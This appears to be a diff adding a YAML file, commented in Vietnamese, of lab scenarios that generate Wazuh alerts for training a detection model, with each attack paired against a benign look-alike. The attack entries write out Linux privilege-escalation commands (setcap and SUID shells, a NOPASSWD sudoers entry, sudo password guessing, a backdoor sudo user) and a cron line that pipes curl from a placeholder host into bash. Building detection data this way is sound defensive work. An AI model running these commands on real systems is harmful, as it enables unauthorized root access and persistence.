@@ -1,0 +1,135 @@
+# Kịch bản sinh dữ liệu train trên lab (victim Linux .20).
+#
+# Nguồn ý tưởng lệnh: Splunk attack_data (Apache-2.0, commit c8af10d) — chỉ lấy LỆNH, không lấy log
+# (log Splunk auditd là mảnh PROCTITLE đã lọc, không replay được qua Wazuh; xem HANDOFF 2026-11-09).
+#
+# Quy tắc:
+#   - Mỗi kịch bản tấn công có một kịch bản benign đối xứng (cùng loại lệnh, ngữ cảnh hợp lệ)
+#     để model học phân biệt, không gán mọi alert là tấn công.
+#   - expected_rules là DỰ KIẾN, phải xác minh bằng alert thật; ghi kết quả vào observed khi chạy.
+#     ID rule đã đối chiếu mô tả trong ruleset của lab (0020-syslog_rules.xml): 5401 sudo sai,
+#     5402 sudo thành ROOT, 5403 lần đầu dùng sudo, 5404 sai sudo 3 lần, 5901/5902 group/user mới,
+#     2961 user được thêm vào group sudo, 2832/2833 crontab user/root đổi, 2834 mở crontab để sửa.
+#   - Chạy cleanup sau mỗi kịch bản để kịch bản sau không bị nhiễu.
+#   - Cách nhau >= 5 phút để mỗi kịch bản rơi vào một cửa sổ alert riêng; ghi giờ bắt đầu/kết thúc.
+#   - split_group_id = id cặp: cả bản attack và benign của một cặp nằm cùng phía train hoặc val.
+#   - KHÔNG giống kịch bản kb1–kb5 của tập test (brute force SSH, useradd đơn lẻ đã có ở test).
+
+version: 1
+scenarios:
+
+  - id: privesc-setcap
+    group: lab:T1548.001/setcap
+    kind: attack
+    mitre: [T1548.001]
+    run_as: user thường có sudo
+    commands:
+      - "cp /usr/bin/python3 /tmp/priv_esc"
+      - "sudo setcap cap_setuid+ep /tmp/priv_esc"
+      - "/tmp/priv_esc -c 'import os; os.setuid(0); os.system(\"id\")'"
+    expected_rules: ["5402 (sudo COMMAND)", "FIM chỉ khi /tmp được giám sát — mặc định KHÔNG"]
+    cleanup: ["sudo rm -f /tmp/priv_esc"]
+
+  - id: benign-setcap
+    group: lab:T1548.001/setcap
+    kind: benign
+    commands:
+      - "sudo setcap cap_net_bind_service=+ep /usr/bin/node   # cho app nghe cổng 80 không cần root"
+    expected_rules: ["5402"]
+    cleanup: ["sudo setcap -r /usr/bin/node"]
+    note: "Chỉ chạy nếu có node; hoặc thay bằng binary dịch vụ có thật trên máy."
+
+  - id: privesc-suid
+    group: lab:T1548.001/suid
+    kind: attack
+    mitre: [T1548.001]
+    commands:
+      - "cp /bin/bash /tmp/vuln"
+      - "sudo chown root:root /tmp/vuln && sudo chmod u+s /tmp/vuln"
+      - "/tmp/vuln -p -c id"
+    expected_rules: ["5402 x2", "rootcheck SUID (chỉ khi rootcheck chạy, chu kỳ dài)"]
+    cleanup: ["sudo rm -f /tmp/vuln"]
+
+  - id: benign-chmod
+    group: lab:T1548.001/suid
+    kind: benign
+    commands:
+      - "sudo chmod 755 /opt/scripts/backup.sh   # admin sửa quyền script backup"
+    expected_rules: ["5402"]
+    cleanup: []
+
+  - id: sudoers-nopasswd
+    group: lab:T1548.003/sudoers
+    kind: attack
+    mitre: [T1548.003]
+    commands:
+      - "sudo useradd -m svc_update"
+      - "echo 'svc_update ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/svc_update"
+    expected_rules: ["5402", "5901", "5902", "554 /etc/sudoers.d/svc_update (nếu syscheck realtime /etc)"]
+    cleanup: ["sudo rm -f /etc/sudoers.d/svc_update", "sudo userdel -r svc_update"]
+
+  - id: benign-sudoers
+    group: lab:T1548.003/sudoers
+    kind: benign
+    commands:
+      - "sudo visudo -f /etc/sudoers.d/deploy   # thêm: deploy ALL=(root) /usr/bin/systemctl restart nginx"
+    expected_rules: ["5402", "554 /etc/sudoers.d/deploy"]
+    cleanup: ["sudo rm -f /etc/sudoers.d/deploy"]
+    note: "Quyền giới hạn 1 lệnh, có chủ đích — khác NOPASSWD: ALL."
+
+  - id: persist-cron
+    group: lab:T1053.003/cron
+    kind: attack
+    mitre: [T1053.003]
+    commands:
+      - "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.0.0.99/x.sh | bash') | crontab -"
+    expected_rules: ["2832 (crontab user đổi)", "FIM /var/spool/cron (nếu giám sát)"]
+    cleanup: ["crontab -r"]
+    note: "IP 10.0.0.99 không tồn tại — chỉ để tạo dấu vết, không tải gì về."
+
+  - id: benign-cron
+    group: lab:T1053.003/cron
+    kind: benign
+    commands:
+      - "(crontab -l 2>/dev/null; echo '0 2 * * * /usr/bin/find /tmp -mtime +7 -delete') | crontab -"
+    expected_rules: ["giống persist-cron"]
+    cleanup: ["crontab -r"]
+
+  - id: sudo-fail-then-success
+    group: lab:T1078/sudo-auth
+    kind: benign
+    commands:
+      - "sudo -k; sudo ls   # gõ sai mật khẩu 2 lần, lần 3 đúng"
+    expected_rules: ["5401", "5402"]
+    cleanup: []
+    note: "Mẫu FP-trap: người dùng gõ nhầm mật khẩu."
+
+  - id: sudo-guess
+    group: lab:T1078/sudo-auth
+    kind: attack
+    mitre: [T1078.003, T1548.003]
+    commands:
+      - "for i in 1 2 3 4 5 6; do echo sai$i | sudo -S -k id; done   # đoán mật khẩu sudo"
+    expected_rules: ["5401 xN", "5404"]
+    cleanup: []
+
+  - id: sudo-group-backdoor
+    group: lab:T1098/sudo-group
+    kind: attack
+    mitre: [T1098, T1136.001]
+    commands:
+      - "sudo useradd -m -s /bin/bash backup_svc"
+      - "sudo usermod -aG sudo backup_svc"
+    expected_rules: ["5402 x2", "5901", "5902", "2961 (thêm vào group sudo)"]
+    cleanup: ["sudo userdel -r backup_svc"]
+    note: "Tên user giả dạng dịch vụ hợp lệ — điểm khó phân biệt với benign-new-admin."
+
+  - id: benign-new-admin
+    group: lab:T1098/sudo-group
+    kind: benign
+    commands:
+      - "sudo useradd -m -s /bin/bash -c 'Nguyen Van A - IT ticket #1234' nva"
+      - "sudo usermod -aG sudo nva"
+    expected_rules: ["5402 x2", "5901", "5902", "2961"]
+    cleanup: ["sudo userdel -r nva"]
+    note: "Alert giống hệt bản attack — khác nhau chỉ ở ngữ cảnh (ticket, giờ hành chính, người thực hiện). Target phải nói rõ: không đủ bằng chứng để phân biệt, cần xác minh ticket."
